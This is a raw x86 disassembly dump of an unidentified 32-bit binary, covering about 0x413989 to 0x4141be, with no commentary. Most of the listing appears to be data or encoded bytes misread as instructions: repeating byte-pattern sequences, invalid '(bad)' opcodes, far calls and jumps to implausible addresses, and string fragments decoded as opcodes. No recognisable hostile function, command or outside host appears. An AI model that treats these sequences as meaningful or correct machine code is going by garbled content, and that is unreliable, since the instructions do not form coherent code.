  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx]
  413b8b:	xor    eax,0x68720043
  413b90:	inc    ebp
  413b91:	inc    ecx
  413b92:	(bad)  
  413b93:	cli    
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	push   ss
  413bd7:	add    BYTE PTR [ebx+0x0],al
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	cmp    dl,BYTE PTR [eax]
  413c28:	inc    ebx
  413c29:	add    BYTE PTR [eax],al
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi+0x572c5414]
  413ea4:	xchg   ebp,eax
  413ea5:	paddsw mm1,mm6
  413ea8:	add    BYTE PTR [eax],al
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    BYTE PTR [esi+0x3c],al
  413eb0:	imul   edx
  413eb2:	xlat   BYTE PTR ds:[ebx]
  413eb3:	mov    dl,0xeb
  413eb5:	outs   dx,BYTE PTR ds:[esi]
  413eb6:	xor    ebx,DWORD PTR [esi-0x621c087]
  413ebc:	jb     0x413e4a
  413ebe:	stos   DWORD PTR es:[edi],eax
  413ebf:	add    edi,DWORD PTR ds:0x8c422537
  413ec5:	aam    0x77
  413ec7:	cmc    
  413ec8:	addr16 xor al,0x46
  413ecb:	pop    ss
  413ecc:	mov    ebx,0x215f4e6c
  413ed1:	in     al,0xbc
  413ed3:	xchg   edx,eax
  413ed4:	xchg   edi,eax
  413ed5:	retf   0x88b5
  413ed8:	mov    ds:0xabebdfa4,eax
  413edd:	imul   ecx,ebx,0xd58eae03
  413ee3:	hlt    
  413ee4:	sbb    dl,ch
  413ee6:	jbe    0x413e85
  413ee8:	test   eax,0x2546ed32
  413eed:	mov    ss,WORD PTR [ebx-0x4b]
  413ef0:	in     eax,dx
  413ef1:	mov    BYTE PTR [esi+edx*8+0x12],bl
  413ef5:	jecxz  0x413f3b
  413ef7:	pop    ss
  413ef8:	mov    al,ds:0x5b3dea74
  413efd:	call   0x78795ffa
  413f02:	mov    bh,0xf6
  413f04:	jp     0x413f67
  413f06:	lahf   
  413f07:	jl     0x413ed5
  413f09:	dec    esi
  413f0a:	push   ecx
  413f0b:	pop    ebp
  413f0c:	xor    BYTE PTR [ebx-0x690720b3],al
  413f12:	fs mov al,0xd3
  413f15:	mov    dh,0xea
  413f17:	pop    edi
  413f18:	scas   al,BYTE PTR es:[edi]
  413f19:	jns    0x413eee
  413f1b:	sti    
  413f1c:	rcl    DWORD PTR [edi+0x58],0xbd
  413f20:	inc    ebx
  413f21:	and    BYTE PTR [esi+eiz*2+0x21],0x88
  413f26:	ins    DWORD PTR es:[edi],dx
  413f27:	mov    esp,0x4da2cb54
  413f2c:	dec    esp
  413f2d:	mov    ebp,0x9941c443
  413f32:	push   0x47
  413f34:	xchg   esp,eax
  413f35:	mov    ch,0x17
  413f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f39:	cs mov esi,0x49dc24fd
  413f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f40:	xor    ebx,DWORD PTR [edi+0x68e490fc]
  413f46:	xchg   BYTE PTR ds:0xe34cdb8f,dh
  413f4c:	push   0x5c60bae9
  413f51:	mov    ah,0xe2
  413f53:	mov    edx,0xad6f6afc
  413f58:	cmp    esp,DWORD PTR [ecx-0x4a]
  413f5b:	xlat   BYTE PTR ds:[ebx]
  413f5c:	xor    edx,ecx
  413f5e:	sbb    DWORD PTR [ebx+ecx*8],esp
  413f61:	ret    0xb6f7
  413f64:	and    eax,0x56c010d8
  413f69:	adc    eax,0x61a7302a
  413f6e:	mov    ebx,0x4ad5750b
  413f73:	add    esi,0x79bac786
  413f79:	stos   BYTE PTR es:[edi],al
  413f7a:	adc    BYTE PTR ds:0xf8cff51,dh
  413f80:	sahf   
  413f81:	mov    bl,BYTE PTR [bp+si]
  413f84:	retf   
  413f85:	jp     0x414002
  413f87:	lds    ecx,FWORD PTR [esi-0x6e197353]
  413f8d:	pop    ebx
  413f8e:	enter  0xbc52,0xa0
  413f92:	push   es
  413f93:	imul   esi,DWORD PTR [esi+edi*2],0xffffffcf
  413f97:	mov    bl,0xc0
  413f99:	out    0x26,al
  413f9b:	jno    0x413f21
  413f9d:	xlat   BYTE PTR ds:[ebx]
  413f9e:	bound  edx,QWORD PTR [edx+0x15]
  413fa1:	aaa    
  413fa2:	outs   dx,BYTE PTR ds:[esi]
  413fa3:	cwde   
  413fa4:	push   ecx
  413fa5:	pop    ebx
  413fa6:	mov    ds:0xe7e76dd1,al
  413fab:	fimul  WORD PTR [edx-0x24adf8cf]
  413fb1:	in     eax,0xd2
  413fb3:	fild   WORD PTR [edi+0x0]
	...
  414016:	pop    edx
  414017:	ficom  DWORD PTR [esi+0x60]
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0x98506cf9
  414025:	(bad)  
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    BYTE PTR [edx+0x6a707e56],dh
  414033:	idiv   DWORD PTR [ebx-0x45]
  414036:	dec    esi
  414037:	or     al,0xdb
  414039:	(bad)  
  41403b:	call   0x1e14b3b5
  414040:	in     eax,dx
  414041:	jb     0x41407e
  414043:	call   DWORD PTR [ebp+0x27064146]
  414049:	dec    esp
  41404a:	or     eax,0xa45c155d
  41404f:	mov    dh,0x1d
  414051:	call   0x879e5102
  414056:	sub    ecx,eax
  414058:	shl    BYTE PTR [ecx],1
  41405a:	jmp    0xfe9ddec3
  41405f:	test   al,0xda
  414061:	push   0xffffffcd
  414063:	retf   0xa0bf
  414066:	stos   BYTE PTR es:[edi],al
  414067:	mov    cl,0x69
  414069:	ret    
  41406a:	stos   DWORD PTR es:[edi],eax
  41406b:	shl    DWORD PTR [ebp+0x6744edf8],cl
  414071:	ror    cl,0x43
  414074:	and    al,BYTE PTR [ecx-0x41da2fa9]
  41407a:	nop
  41407b:	inc    esp
  41407c:	jb     0x4140ae
  41407e:	ret    
  41407f:	pop    edx
  414080:	scas   eax,DWORD PTR es:[edi]
  414081:	adc    ah,bh
  414083:	int    0x7f
  414085:	xor    dl,BYTE PTR [esp+ebp*4+0x3486a2a8]
  41408c:	ins    DWORD PTR es:[edi],dx
  41408d:	inc    ebx
  41408e:	dec    ebp
  41408f:	jmp    FWORD PTR [ecx]
  414091:	loopne 0x4140b0
  414093:	sub    BYTE PTR [eax],dh
  414095:	pop    esi
  414096:	cwde   
  414097:	sub    edx,DWORD PTR [edi+0x1d957282]
  41409d:	pop    esi
  41409e:	push   cs
  41409f:	out    0xfc,eax
  4140a1:	jb     0x4140b3
  4140a3:	ins    DWORD PTR es:[edi],dx
  4140a4:	enter  0x5eac,0xba
  4140a8:	push   ss
  4140a9:	lock movhps xmm3,QWORD PTR [ecx-0xd]
  4140ae:	pop    ds
  4140af:	inc    ebp
  4140b0:	or     BYTE PTR [ebp-0x1d0cf61d],bl
  4140b6:	in     al,0x93
  4140b8:	ror    BYTE PTR [edx+0x10],0x75
  4140bc:	leave  
  4140bd:	dec    ebp
  4140be:	dec    esi
  4140bf:	dec    esi
  4140c0:	and    esp,DWORD PTR [eax-0x58]
  4140c3:	sbb    eax,0x79cdb954
  4140c8:	rcr    DWORD PTR fs:[edx+ebp*8+0x67],cl
  4140cd:	shl    bh,0x6c
  4140d0:	push   esi
  4140d1:	cmc    
  4140d2:	ins    DWORD PTR es:[edi],dx
  4140d3:	outs   dx,BYTE PTR ds:[esi]
  4140d4:	hlt    
  4140d5:	sub    esp,DWORD PTR [edi+0x1209a24a]
  4140db:	xor    al,0x30
  4140dd:	call   0xb98c1582
  4140e2:	mov    ecx,0xd8a7d9c7
  4140e7:	imul   esp,DWORD PTR [ebp-0x25],0x75
  4140eb:	lds    ecx,FWORD PTR [edx]
  4140ed:	xor    dl,BYTE PTR [eax]
  4140ef:	add    cl,dh
  4140f1:	repz aam 0x11
  4140f4:	inc    esi
  4140f5:	push   ecx
  4140f6:	xchg   esi,eax
  4140f7:	fild   QWORD PTR [ebp+0x219430a]
  4140fd:	fmul   QWORD PTR [eax]
  4140ff:	mov    cl,0x99
  414101:	xor    eax,DWORD PTR [eax]
  414103:	std    
  414104:	or     al,0xe1
  414106:	mov    ch,0x62
  414108:	jmp    0xedcf:0xa7688c9a
  41410f:	imul   edi,DWORD PTR [esi],0xffffffd4
  414112:	clc    
  414113:	dec    esp
  414114:	xchg   DWORD PTR [ecx],ebp
  414116:	and    DWORD PTR [edi],ebx
  414118:	jmp    0x4140a6
  41411a:	call   0xc5ae9c74
  41411f:	sub    al,0xa9
  414121:	fwait
  414122:	jmp    0xf68d0427
  414127:	ins    DWORD PTR es:[edi],dx
  414128:	outs   dx,DWORD PTR ds:[esi]
  414129:	ficomp DWORD PTR [ebx]
  41412b:	pop    edx
  41412c:	xchg   ecx,eax
  41412d:	cmp    bh,bh
  41412f:	or     al,0x28
  414131:	jge    0x4140b4
  414133:	ret    0x85
	...
  414196:	add    dl,BYTE PTR [edx]
  414198:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0x1216adb4
  4141a5:	sahf   
  4141a6:	sti    
  4141a7:	rol    BYTE PTR [eax],1
  4141a9:	add    BYTE PTR [edi],al
  4141ab:	add    DWORD PTR [eax],eax
  4141ad:	add    dl,dl
  4141af:	mov    DWORD PTR [bp+di+0x44],esi
  4141b3:	mov    ecx,0xa6b4a6a5
  4141b8:	imul   esp,DWORD PTR [ecx+0x3f],0x52
  4141bc:	loop   0x414145
  4141be:	leave  
